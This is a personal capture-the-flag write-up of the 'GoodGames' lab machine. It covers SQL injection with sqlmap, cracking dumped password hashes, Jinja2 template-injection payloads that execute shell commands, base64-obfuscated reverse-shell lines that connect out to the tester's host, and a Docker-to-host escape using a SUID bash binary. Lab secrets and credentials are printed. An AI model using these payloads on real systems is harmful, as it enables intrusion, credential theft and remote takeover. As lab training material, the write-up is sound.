Little enumeration and we find 
![[Pasted image 20241107140249.png]]

Werkzeug seems to be vulnerable:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

We can either:
+ [ ] Some domain or subdomain where debug mode is enabled and `{url}/console` is exposed.
+ [ ] Explore the webpage for further vulns.


We can log in. After logging in, you have a prompt where you can change your passwd.
The post form looks like:
```
POST /password-reset HTTP/1.1
Host: goodgame.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://goodgame.htb
Connection: close
Referer: http://goodgame.htb/profile
Cookie: session=eyJfZnJlc2giOmZhbHNlLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpZCI6MiwibG9nZ2VkaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Zyy8GA.M7RyPNdPrGfQf53vcc46Hug328Y
Upgrade-Insecure-Requests: 1
Priority: u=0, i

password=123&password2=123
```

Ge are Also checking gobuster once again, but excluding the length of the "404" webpage (which returns a 200 status) so we can avoid the fallthrough webpage.

After some search I've found that flask's session cookies can be decoded, and mine is:
```
{
    "_fresh": false,
    "email": "test@test.com",
    "id": 2,
    "loggedin": true,
    "username": "test"
}
```

And after some further research, it's time to bruteforce:
https://github.com/Paradoxis/Flask-Unsign

After some failing dictionary attacks (and some exploration of wordlist generation as CUPP) I've found that the comming-soon webpge has an interesting mail prompt with a curious GET petition:
```
GET /subscribe/post-json?u=d433160c0c43dcf8ecd52402f&id=7eafafe8f0&c=jQuery331043365897636388495_1730989549554&EMAIL=ASDASD%40123123.1&b_d433160c0c43dcf8ecd52402f_7eafafe8f0=&_=1730989549555 HTTP/1.1
```
Also it goes with no cookies


```
POST /forgot-password HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://goodgames.htb
Connection: close
Referer: http://goodgames.htb/forgot-password
Priority: u=0

Email=admin%40goodgames.htb
```

![[Pasted image 20241107154537.png]]![[Pasted image 20241107154552.png]]

The key was to try to perform some sql injection to access the admin user. 

POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://goodgames.htb
Connection: close
Referer: http://goodgames.htb/signup
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=admin%40goodgames.htb&password=PASS

The key here is using sqlmap to discover potential sql-injections. To do so, identify some part of the code where a sql query may be made (login, forms, dashboards, ...). Check the post being made and copy the url and data to perform the post and go for:
```
sqlmap --url=http://goodgames.htb/login --data="email=admin%40goodgames.htb&password=PASS" --banner 
```

After passing to sqlmap the url with the `/login` termination and the --data `email=admin@goodgames.htb`, the username `main_admin@l` is shown.

We can run also `sqlmap --dbs -r file.req` to obtain the name of the existing databases.

```
Ξ crest_crt/goodgames → nmap -sV --script=nfs-showmount remote.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-07 18:28 CET

↑130 crest_crt/goodgames → sqlmap --dbs -r req.req
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:28:59 /2024-11-07/

[18:28:59] [INFO] parsing HTTP request from 'req.req'
[18:28:59] [INFO] resuming back-end DBMS 'mysql' 
[18:28:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@goodgames.htb' AND (SELECT 3440 FROM (SELECT(SLEEP(5)))VGFl) AND 'YHIv'='YHIv&password=PASS
---
[18:29:00] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:29:00] [INFO] fetching database names
[18:29:00] [INFO] fetching number of databases
[18:29:00] [INFO] resumed: 2
[18:29:00] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                    
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[18:29:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[18:29:30] [INFO] adjusting time delay to 3 seconds due to good response times
information_schema
[18:33:22] [INFO] retrieved: ma
[18:34:03] [ERROR] invalid character detected. retrying..
[18:34:03] [WARNING] increasing time delay to 4 seconds
in
available databases [2]:
[*] information_schema
[*] main

[18:34:34] [INFO] fetched data logged to text files under '/home/lotape6/.sqlmap/output/goodgames.htb'
[18:34:34] [WARNING] you haven't updated sqlmap for more than 1679 days!!!

[*] ending @ 18:34:34 /2024-11-07/

```
Inspectin tables:
```
$ sqlmap -r req.req -D main --tables

Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+
```
Inspecting columns:
```
$ sqlmap -r req.req -D main --columns
$ sqlmap -r req.req -D main -T user -C password --dump

.
.
.


> /home/lotape6/resources/hack/rockyou.txt
[18:55:43] [INFO] using custom dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[18:55:46] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[18:55:46] [INFO] starting 12 processes 
[18:55:47] [INFO] cracked password 'test' for hash '098f6bcd4621d373cade4e832627b4f6'                   
[18:56:02] [INFO] cracked password 'superadministrator' for hash '2b22337f218b2d82dfc3b6f77e7cb8ec'     
Database: main                                                                                          
Table: user
[2 entries]
+-------------------------------------------------------+
| password                                              |
+-------------------------------------------------------+
| 098f6bcd4621d373cade4e832627b4f6 (test)               |
| 2b22337f218b2d82dfc3b6f77e7cb8ec (superadministrator) |
+-------------------------------------------------------+


```

In ```http://internal-administration.goodgames.htb/login``` you can find out that `admin` and `superadministrator` does work for credentials.

In the settings tab we inspect the post on a new user creation:

```
POST /settings HTTP/1.1
Host: internal-administration.goodgames.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://internal-administration.goodgames.htb
Connection: keep-alive
Referer: http://internal-administration.goodgames.htb/settings
Cookie: session=.eJwljk1qQzEMhO_idRbWj205l3lIlkRLoIX3klXI3WvobuYbhpl3OfKM66vcn-crbuX49nIvk6iyLJrZRYdRDYc6UUwcgqXRwjWSBgSRSa2NOpKtljrEXZZ32BprBFp16snSc7Sq1nd5M5ywoxRnBUkjaDiZQQhS2bPsI68rzv83sO26zjyev4_42UAn0lIV25vDh6aY6sJ05JGtARmzCmP5_AGBuD8y.Zy4IlA.OH2OCiJCAnlEfrDhsl4CDUlL_bU
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=ASD


================================================================================
POST /settings? HTTP/1.1
Host: internal-administration.goodgames.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://internal-administration.goodgames.htb
Connection: keep-alive
Referer: http://internal-administration.goodgames.htb/settings?
Cookie: session=.eJwljk1qQzEMhO_idRbWj205l3lIlkRLoIX3klXI3WvobuYbhpl3OfKM66vcn-crbuX49nIvk6iyLJrZRYdRDYc6UUwcgqXRwjWSBgSRSa2NOpKtljrEXZZ32BprBFp16snSc7Sq1nd5M5ywoxRnBUkjaDiZQQhS2bPsI68rzv83sO26zjyev4_42UAn0lIV25vDh6aY6sJ05JGtARmzCmP5_AGBuD8y.Zy4IlA.OH2OCiJCAnlEfrDhsl4CDUlL_bU
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=BBB
```

From `http://internal-administration.goodgames.htb/transactions?`

```
GET /transactions? HTTP/1.1
Host: internal-administration.goodgames.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://internal-administration.goodgames.htb/transactions?
Cookie: session=.eJwljk1qQzEMhO_idRbWj205l3lIlkRLoIX3klXI3WvobuYbhpl3OfKM66vcn-crbuX49nIvk6iyLJrZRYdRDYc6UUwcgqXRwjWSBgSRSa2NOpKtljrEXZZ32BprBFp16snSc7Sq1nd5M5ywoxRnBUkjaDiZQQhS2bPsI68rzv83sO26zjyev4_42UAn0lIV25vDh6aY6sJ05JGtARmzCmP5_AGBuD8y.Zy4IlA.OH2OCiJCAnlEfrDhsl4CDUlL_bU
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

After multiple tries, no sql injection is detected. But trying to perform some STTI, we find out that the settings tab contains a injectable field -> Name:

If you insert the following payload `{{2*2}}` and you find out that the name outputted is `4`. After so, you can go and inspect the interesting wordlist for stti #template-injection-wordlist and find out that for JINJA2 running on python there is an interesting variable `self._TemplateReference__context
`
```
#### <Context {'dict': <class 'dict'>, 'get_flashed_messages': <function get_flashed_messages at 0x7fb8c72fcae8>, 'session': <SecureCookieSession {'_fresh': False, '_id': '933048c39f68a7b30ed10928b8d1e4853c2c7f371e33b80053623bc5fa78dd8cd615fa20ee2b0d36f486f750ab68532b0291e2bf8d4a18fb31529441831fa4df', '_user_id': '1', 'csrf_token': 'a923caa8b3bc7d7af8baac2fd247f5513b44a842'}>, 'url_for': <function url_for at 0x7fb8c72fc8c8>, 'config': <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'S3cr3t_K#Key', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:////backend/project/apps/db.sqlite3', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>, 'range': <class 'range'>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'request': <Request 'http://localhost:8085/settings' [POST]>, 'g': <flask.g of 'apps'>, 'lipsum': <function generate_lorem_ipsum at 0x7fb8c7731488>, 'namespace': <class 'jinja2.utils.Namespace'>, 'segment': 'settings', 'current_user': admin} of None>
```
In there you can find some interesting value:
```
'SECRET_KEY': 'S3cr3t_K#Key'
'SQLALCHEMY_DATABASE_URI': 'sqlite:////backend/project/apps/db.sqlite3'
```
Since we know it's running Jinja2 we directly go to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
```
Trying-> [].__class__
Output-> <class 'list'>

Trying-> [].__class__.mro()[-1]
Output-> <class 'object'>

Trying -> [].__class__.mro()[1].__subclasses__()
Output -> reeeeally long list -> after formatting, and searching for Popen the index is 217

[].__class__.mro()[1].__subclasses__()[217]('ls',shell=True,stdout=-1).communicate()[0].strip()

[].__class__.mro()[1].__subclasses__()[217]('cat /home/augustus/user.txt',shell=True,stdout=-1).communicate()[0].strip()

user.txt --> 72f6...

Next payload 
bash -i >& /dev/tcp/10.10.14.3/31415 0>&1

[].__class__.mro()[1].__subclasses__()[217]('
/bin/bash -l > /dev/tcp/10.10.14.3/31415 0>&1 2>&1',shell=True,stdout=-1).communicate()[0].strip()

```

After trying several reverse shells without success, we can find any other open port:
```
{{[].__class__.mro()[1].__subclasses__()[217]('netstat -tulpn | grep LISTEN',shell=True,stdout=-1).communicate()[0].strip()}}

tcp 0 0 0.0.0.0:8085 0.0.0.0:* LISTEN 1/python3 
tcp 0 0 127.0.0.11:44383 0.0.0.0:* LISTEN -
```

So lets forward to us:
```
ssh -R 7000:localhost:44383 lotape6@10.10.14.3

```

Looks like there is no SSH
Looks like we are inside docker and looks like we had to obfuscate the shell into base64 in order to get a reverse shell

https://pentestbook.six2dez.com/exploitation/reverse-shells

```
{{[].__class__.mro()[1].__subclasses__()[217]('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi8zMTQxNSAwPiYxCg==|base64${IFS}-d|bash',shell=True,stdout=-1).communicate()[0].strip()}}
```

It's now time to sanitize the reverse shell #sanitize #reverse-shell 

Once inside, as we know we are inside Docker, we can try to communicate with the outside. Then we check our current network:
```
ifconfig



for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done

```

After discovering that the 22 port is open, we start trying our credentials with all known users into the host machine:
```
ssh augustus@172.19.0.1 -> superadministrator #hit
```

Executing some `linpeas.sh` we find some interesting data: 
```
define('USER_ID', '3177898544');
define('USER_NAME', 'nkdevv');
```

We find out little things, but taking a look to the GoodGames app in `/var/wwww/goodgames` we find a secret key under the `goodgames.wsgi`:
```
8ea72...

```
It definitely looks like an MD5 so lets try yo retrieve it.

Then after trying to bruteforce the MD5 we find out another interesting file:

```
Auth.py contains creds for mysql: 
user:
main_admin
pass:
C4n7_Cr4cK_7H1S_pasSw0Rd!
```

Finally no hashcat nor file shall be checked, but the idea was to exploit the root access and the mounted dir /home/august in order to copy the bash executable there, then exit from ssh  and with root privileges in docker we modify the binary to be owned by root and have execution permissions for august user:

```
# As root in the docker container 
chown root:root bash
chmod 4755 bash
ssh august@172.19.0.1 
```
And now in the host machine you can already check the privileges and run the bash -p to get full access as a root to bash:
```
-p  Turned on whenever the real and effective user ids do not match. Disables processing of the $ENV file and importing of shell functions. Turning this option off causes the effective uid and gid to be set to the real uid and gid. 
```

```
./bash -p
<we are root>
```